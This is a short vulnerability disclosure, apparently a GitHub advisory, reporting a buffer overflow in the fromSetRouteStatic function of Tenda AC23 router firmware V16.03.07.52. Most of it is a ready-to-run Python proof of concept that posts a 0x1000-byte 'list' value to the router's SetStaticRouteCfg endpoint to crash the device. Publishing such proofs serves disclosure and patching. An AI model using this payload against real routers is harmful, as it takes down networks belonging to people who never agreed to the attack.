A buffer overflow vulnerability in Tenda AC23 V16.03.07.52 occurs because the fromSetRouteStatic function does not check the length of input data, which can be exploited by attackers to launch a denial of service attack.

<img width="415" height="165" alt="image" src="https://github.com/user-attachments/assets/5710aaca-6de9-4e19-ad92-e05f157c34d6" />


POC：
```
from pwn import *
import requests

payload = b'a'*0x1000

url = "http://192.168.100.254/goform/SetStaticRouteCfg"

cookie = {"Cookie":"password=12345"}
data = {"list": payload}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
print(response.text)
```
